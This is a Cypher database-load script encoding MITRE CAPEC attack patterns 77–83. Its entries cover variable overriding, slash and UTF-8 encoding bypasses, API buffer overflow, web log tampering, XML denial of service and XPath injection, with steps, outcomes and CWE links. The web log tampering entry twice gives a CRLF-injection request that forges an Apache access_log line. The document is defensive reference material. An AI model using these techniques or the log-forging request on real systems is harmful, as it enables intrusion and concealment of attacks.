CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Inject context-appropriate malicious file path using web test frameworks (proxies, TamperData, custom programs, etc.) or simple HTTP requests</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Inject context-appropriate malicious file system control syntax</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Inventorying in prior step is successful.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "One or more injections that are appropriate to the platform provoke an unexpected response from the software, which can be varied by the attacker based on the input."});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Manipulate files accessible by the application", description: "<div level=\"0\">\n  <p class=\"text\">The attacker may steal information or directly manipulate files (delete, copy, flush, etc.)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects context-appropriate malicious file path to access the content of the targeted file.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects context-appropriate malicious file system control syntax to access the content of the targeted file.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects context-appropriate malicious file path to cause the application to create, delete a targeted file.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects context-appropriate malicious file system control syntax to cause the application to create, delete a targeted file.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects context-appropriate malicious file path in order to manipulate the meta-data of the targeted file.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 6, description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects context-appropriate malicious file system control syntax in order to manipulate the meta-data of the targeted file.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The software performs an action the attacker desires. This might be displaying information, storing information in a file, delete a file or some other malicious activity."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.76.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 23});
MERGE (:CWE{id: 22});
MERGE (:CWE{id: 73});
MERGE (:CWE{id: 77});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 348});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 264});
MERGE (:CWE{id: 272});
MERGE (:CWE{id: 59});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 15});
MERGE (:CWE{id: 715});
CREATE (:AttackPattern{id: 77, name: "Manipulating User-Controlled Variables", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 513, text: "<div level=\"0\">\n  <p class=\"text\">A variable consumed by the application server is exposed to the client.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 514, text: "<div level=\"0\">\n  <p class=\"text\">A variable consumed by the application server can be overwritten by the user.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 515, text: "<div level=\"0\">\n  <p class=\"text\">The application server trusts user supplied data to compute business logic.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 516, text: "<div level=\"0\">\n  <p class=\"text\">The application server does not perform proper input validation.</p>\n</div>"});
CREATE (:Submission{id: 590});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 363});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 584, summary: "OrderedDict([('Text', 'This attack targets user controlled variables (DEBUG=1, PHP Globals, and So Forth). An attacker can override environment variables leveraging user-supplied, untrusted query variables directly used on the application server without any data sanitization. In extreme cases, the attacker can change variables controlling the business logic of the application. For instance, in languages like PHP, a number of poorly set default configurations may allow the user to override variables.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker communicates with the application server using a thin client (browser) or thick client.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">While communicating with the server, the attacker finds that she can control and override a variable consumed by the application server.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker overrides the variable and influences the normal behavior of the application server.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.77.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{local_id: "R.77.2", author: "Artur Maj", title: "Securing PHP: Step-by-Step", publisher: "Security Focus", pubdate: "June 22, 2003", link: "http://www.securityfocus.com/infocus/1706"});
MERGE (:Reference{local_id: "R.77.3", author: "Clancy Malcolm", title: "Ten Security Checks for PHP, Part 1", pubdate: "2003-03-20"});
MERGE (:Reference{local_id: "R.77.4", title: "PHP Manual", section: "Chapter 29. Using Register Globals", publisher: "The PHP Group", link: "http://www.php.net/manual/en/security.globals.php"});
MERGE (:CWE{id: 473});
MERGE (:CWE{id: 15});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 302});
MERGE (:CWE{id: 94});
MERGE (:CWE{id: 96});
CREATE (:AttackPattern{id: 78, name: "Using Escaped Slashes in Alternate Encoding", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 517, text: "<div level=\"0\">\n  <p class=\"text\">The application accepts the backlash character as escape character.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 518, text: "<div level=\"0\">\n  <p class=\"text\">The application server does incomplete input data decoding, filtering and validation.</p>\n</div>"});
CREATE (:Submission{id: 591});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 364});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 585, summary: "OrderedDict([('Text', 'This attack targets the use of the backslash in alternate encoding. An attacker can provide a backslash as a leading character and causes a parser to believe that the next character is special. This is called an escape. By using that trick, the attacker tries to exploit alternate ways to encode the same character which leads to filter problems and opens avenues to attack.')])"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker can send input data to the host target (e.g., via http request or command line request</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker craft malicious input data which includes escaped slashes. The attacker may need multiple attempts before finding a successful combination.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.78.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.78.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:CWE{id: 180});
MERGE (:CWE{id: 181});
MERGE (:CWE{id: 173});
MERGE (:CWE{id: 171});
MERGE (:CWE{id: 172});
MERGE (:CWE{id: 73});
MERGE (:CWE{id: 21});
MERGE (:CWE{id: 22});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 707});
CREATE (:AttackPattern{id: 79, name: "Using Slashes in Alternate Encoding", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 519, text: "<div level=\"0\">\n  <p class=\"text\">The application server accepts paths to locate resources.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 520, text: "<div level=\"0\">\n  <p class=\"text\">The application server does insufficient input data validation on the resource path requested by the user.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 521, text: "<div level=\"0\">\n  <p class=\"text\">The access right to resources are not set properly.</p>\n</div>"});
CREATE (:Submission{id: 592});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 365});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 586, summary: "OrderedDict([('Text', 'This attack targets the encoding of the Slash characters. An attacker would try to exploit common filtering problems related to the use of the slashes characters to gain access to resources on the target host. Directory-driven systems, such as file systems and databases, typically use the slash character to indicate traversal between directories or other container components. For murky historical reasons, PCs (and, as a result, Microsoft OSs) choose to use a backslash, whereas the UNIX world typically makes use of the forward slash. The schizophrenic result is that many MS-based systems are required to understand both forms of the slash. This gives the attacker many opportunities to discover and abuse a number of common filtering problems. The goal of this pattern is to discover server software that only applies filters to one version, but not the other.')])"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker has access to a resource path and required to use slashes as resource delimiter.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker tries variation and combination of the slashes characters in different encoding format.</p>\n</div>"});
CREATE (:AttackStep{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">The attacker found an unfiltered combination which maps to a valid path and accesses unauthorized resources (directories, files, etc.)</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.79.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-40", local_id: "R.79.2", author: "Markus Kuhn", title: "UTF-8 and Unicode FAQ for Unix/Linux", pubdate: "June 4, 1999", link: "http://www.cl.cam.ac.uk/~mgk25/unicode.html"});
MERGE (:Reference{id: "REF-35", local_id: "R.79.3", author: "Gunter Ollmann", title: "URL Encoded Attacks - Attacks using the common web browser", publisher: "CGISecurity.com", link: "http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html"});
MERGE (:CWE{id: 173});
MERGE (:CWE{id: 171});
MERGE (:CWE{id: 180});
MERGE (:CWE{id: 181});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 73});
MERGE (:CWE{id: 21});
MERGE (:CWE{id: 22});
MERGE (:CWE{id: 185});
MERGE (:CWE{id: 200});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 707});
CREATE (:AttackPattern{id: 8, name: "Buffer Overflow in an API Call", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 522, text: "<div level=\"0\">\n  <p class=\"text\">The target host exposes an API to the user.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 523, text: "<div level=\"0\">\n  <p class=\"text\">One or more API functions exposed by the target host has a buffer overflow vulnerability.</p>\n</div>"});
CREATE (:Submission{id: 593});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 587, summary: "OrderedDict([('Text', \"This attack targets libraries or shared code modules which are vulnerable to buffer overflow attacks. An attacker who has access to an API may try to embed malicious code in the API function call and exploit a buffer overflow vulnerability in the function's implementation. All clients that make use of the code library thus become vulnerable by association. This has a very broad effect on security across a system, usually affecting more than one software process.\")])"});
CREATE (:AttackPhase{id: 1, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker can call an API exposed by the target host.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">On the probing stage, the attacker injects malicious code using the API call and observes the results. The attacker's goal is to uncover a buffer overflow vulnerability.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker finds a buffer overflow vulnerability, crafts malicious code and injects it through an API call. The attacker can at worst execute remote code on the target host.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.8.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.8.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-119: Buffer Errors", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/119.html"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 119});
MERGE (:CWE{id: 118});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 680});
MERGE (:CWE{id: 733});
MERGE (:CWE{id: 697});
CREATE (:AttackPattern{id: 80, name: "Using UTF-8 Encoding to Bypass Validation Logic", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 524, text: "<div level=\"0\">\n  <p class=\"text\">The application's UTF-8 decoder accepts and interprets illegal UTF-8 characters or non-shortest format of UTF-8 encoding.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 525, text: "<div level=\"0\">\n  <p class=\"text\">Input filtering and validating is not done properly leaving the door open to harmful characters for the target host.</p>\n</div>"});
CREATE (:Submission{id: 594});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 588, summary: "OrderedDict([('Text', 'This attack is a specific variation on leveraging alternate encodings to bypass validation logic. This attack leverages the possibility to encode potentially harmful input in UTF-8 and submit it to applications not expecting or effective at validating this encoding standard making input filtering difficult. UTF-8 (8-bit UCS/Unicode Transformation Format) is a variable-length character encoding for Unicode. Legal UTF-8 characters are one to four bytes long. However, early version of the UTF-8 specification got some entries wrong (in some cases it permitted overlong characters). UTF-8 encoders are supposed to use the \"shortest possible\" encoding, but naive decoders may accept encodings that are longer than necessary. According to the RFC 3629, a particularly subtle form of this attack can be carried out against a parser which performs security-critical validity checks against the UTF-8 encoded form of its input, but interprets certain illegal octet sequences as characters.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey the application for user-controllable inputs", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Inputs are used by the application or the browser (DOM)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding parameters (POST, GET, COOKIE, etc.) is created by the attacker."});
CREATE (:Outcome{id: 2, type: "Success", description: "A list of application user interface entry fields is created by the attacker."});
CREATE (:Outcome{id: 3, type: "Success", description: "A list of resources accessed by the application is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Probe entry points to locate vulnerabilities", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses the entry points gathered in the \"Explore\" phase as a target list and injects various UTF-8 encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Try to use UTF-8 encoding of content in Scripts in order to bypass validation routines.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Try to use UTF-8 encoding of content in HTML in order to bypass validation routines.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Try to use UTF-8 encoding of content in CSS in order to bypass validation routines.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The application accepts user-controllable input.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's UTF-8 encoded payload is processed and acted on by the application without filtering or transcoding"});
CREATE (:Outcome{id: 2, type: "Failure", description: "The application decodes the charset and filters the inputs."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Detective"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.80.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.80.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:Reference{id: "REF-18", local_id: "R.80.3", author: "David Wheeler", title: "Secure Programming for Linux and Unix HOWTO", section: "5.9. Character Encoding", link: "http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/character-encoding.html"});
MERGE (:Reference{local_id: "R.80.4", author: "['Michael Howard', 'David LeBlanc']", title: "Writing Secure Code", section: "Chapter 12", publisher: "Microsoft Press"});
MERGE (:Reference{local_id: "R.80.5", author: "Bruce Schneier", pubdate: "2000-07-15", link: "http://www.schneier.com/crypto-gram-0007.html"});
MERGE (:Reference{id: "REF-6", local_id: "R.80.6", title: "Wikipedia", section: "UTF-8", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/UTF-8"});
MERGE (:Reference{local_id: "R.80.7", author: "F. Yergeau", title: "RFC 3629 - UTF-8, a transformation format of ISO 10646", pubdate: "November 2003", link: "http://www.faqs.org/rfcs/rfc3629.html"});
MERGE (:Reference{id: "REF-19", local_id: "R.80.8", author: "Eric Hacker", title: "IDS Evasion with Unicode", pubdate: "January 3, 2001", link: "http://www.securityfocus.com/infocus/1232"});
MERGE (:Reference{local_id: "R.80.9", title: "Corrigendum #1: UTF-8 Shortest Form", publisher: "Unicode, Inc.", pubdate: "March 2001", link: "http://www.unicode.org/versions/corrigendum1.html"});
MERGE (:Reference{id: "REF-40", local_id: "R.80.10", author: "Markus Kuhn", title: "UTF-8 and Unicode FAQ for Unix/Linux", pubdate: "June 4, 1999", link: "http://www.cl.cam.ac.uk/~mgk25/unicode.html"});
MERGE (:Reference{local_id: "R.80.11", author: "Markus Kuhn", title: "UTF-8 decoder capability and stress test", pubdate: "February 19, 2003", link: "http://www.cl.cam.ac.uk/%7Emgk25/ucs/examples/UTF-8-test.txt"});
MERGE (:CWE{id: 173});
MERGE (:CWE{id: 172});
MERGE (:CWE{id: 180});
MERGE (:CWE{id: 181});
MERGE (:CWE{id: 171});
MERGE (:CWE{id: 73});
MERGE (:CWE{id: 21});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 692});
CREATE (:AttackPattern{id: 81, name: "Web Logs Tampering", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 526, text: "<div level=\"0\">\n  <p class=\"text\">Target server software must be a HTTP server that performs web logging.</p>\n</div>"});
CREATE (:Submission{id: 595});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 366});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Weaknesses"});
CREATE (:Description{id: 589, summary: "OrderedDict([('Text', 'Web Logs Tampering attacks involve an attacker injecting, deleting or otherwise tampering with the contents of web logs typically for the purposes of masking other malicious behavior. Additionally, writing malicious data to log files may target jobs, filters, reports, and other agents that process the logs in an asynchronous attack pattern. This pattern of attack is similar to \"Log Injection-Tampering-Forging\" except that in this case, the attack is targeting the logs of the web server and not the application.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Determine Application Web Server Log File Format", description: "<div level=\"0\">\n  <p class=\"text\">The attacker observes the system and looks for indicators of which logging utility is being used by the web server.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine logging utility being used by application web server (e.g. log4j), only possible if the application is known by the attacker or if the application returns error messages with logging utility information.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker determines log file format used by application web server."});
CREATE (:Outcome{id: 2, type: "Inconclusive", description: "Attacker cannot conclusively determine log file format; he/she can only guess what the format is."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Determine Injectable Content", description: "<div level=\"0\">\n  <p class=\"text\">The attacker launches various logged actions with malicious data to determine what sort of log injection is possible.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker triggers logged actions with maliciously crafted data as inputs, parameters, arguments, etc.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker observes content successfully injected into web logs."});
CREATE (:Outcome{id: 2, type: "Inconclusive", description: "Attacker lacks capability to observe if content was successfully injected into web logs."});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Manipulate Log Files", description: "<div level=\"0\">\n  <p class=\"text\">The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted request that the web server will receive and write into the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Indirectly through injection, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.</p>\n  <p class=\"text\">For example: The HTTP request for \"/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] \"GET /forged-path HTTP/1.1\" 200 - \"-\" USER_AGENT\" may add the log line into Apache \"access_log\" (for example). Different applications may require different encodings of the carriage return and line feed characters.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Directly through log file or database manipulation, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry.</p>\n  <p class=\"text\">For example: The HTTP request for \"/index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] \"GET /forged-path HTTP/1.1\" 200 - \"-\" USER_AGENT\" may add the log line into Apache \"access_log\" (for example). Different applications may require different encodings of the carriage return and line feed characters.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Directly through log file or database manipulation, modify existing log entries.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Forged entry or other malicious data inserted into application's logs."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No entry inserted into logs, or the entry is visibly distinguishable from real entries."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.81.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 117});
MERGE (:CWE{id: 93});
MERGE (:CWE{id: 75});
MERGE (:CWE{id: 221});
MERGE (:CWE{id: 96});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 150});
MERGE (:CWE{id: 276});
MERGE (:CWE{id: 279});
MERGE (:CWE{id: 116});
MERGE (:CWE{id: 713});
CREATE (:ResourcesRequired{id: 276, text: "<div level=\"0\">\n  <p class=\"text\">Ability to send specially formatted HTTP request to web server</p>\n</div>"});
CREATE (:AttackPattern{id: 82, name: "Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 527, text: "<div level=\"0\">\n  <p class=\"text\">Attacker must be able to send a malicious XML payload to host, such as SOAP or REST web service.</p>\n</div>"});
CREATE (:Submission{id: 596});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 590, summary: "OrderedDict([('Text', [\"XML Denial of Service (XDoS) can be applied to any technology that utilizes XML data. This is, of course, most distributed systems technology including Java, .Net, databases, and so on. XDoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious XML payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. The main weakness in XDoS is that the service provider generally must inspect, parse, and validate the XML messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that XDoS targets.\", 'There are three primary attack vectors that XDoS can navigate', 'All of the above attacks exploit the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.']), ('Block', OrderedDict([('@Block_Nature', 'List'), ('Text', ['Target CPU through recursion: attacker creates a recursive payload and sends to service provider', 'Target memory through jumbo payloads: service provider uses DOM to parse XML. DOM creates in memory representation of XML document, but when document is very large (for example, north of 1 Gb) service provider host may exhaust memory trying to build memory objects.', 'XML Ping of death: attack service provider with numerous small files that clog the system.'])]))])"});
MERGE (:CWE{id: 674});
MERGE (:CWE{id: 400});
MERGE (:CWE{id: 770});
CREATE (:AttackPattern{id: 83, name: "XPath Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 528, text: "<div level=\"0\">\n  <p class=\"text\">XPath queries used to retrieve information stored in XML documents</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 529, text: "<div level=\"0\">\n  <p class=\"text\">User-controllable input not properly sanitized before being used as part of XPath queries</p>\n</div>"});
CREATE (:Submission{id: 597});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 591, summary: "OrderedDict([('Text', 'An attacker can craft special user-controllable input consisting of XPath expressions to inject the XML database and bypass authentication or glean information that he normally would not be able to. XPath Injection enables an attacker to talk directly to the XML database, thus bypassing the application completely. XPath Injection results from the failure of an application to properly sanitize input used as part of dynamic XPath expressions used to query an XML database. In order to successfully inject XML and retrieve information from a database, an attacker:')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determines the user-controllable input that is used without proper validation as part of XPath queries</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Determines the structure of queries that accept such input</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Crafts malicious content containing XPath expressions that is not validated by the application and is executed as part of the XPath queries.</p>\n</div>"});
MERGE (:Reference{id: "REF-3", local_id: "R.83.1", title: "Common Weakness Enumeration (CWE)", section: "CWE-91 - XML Injection", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/91.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.83.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.83.3", title: "Common Weakness Enumeration (CWE)", section: "CWE-390 - Improper Error Handling", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/390.html"});
MERGE (:CWE{id: 91});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 390});
MERGE (:CWE{id: 713});
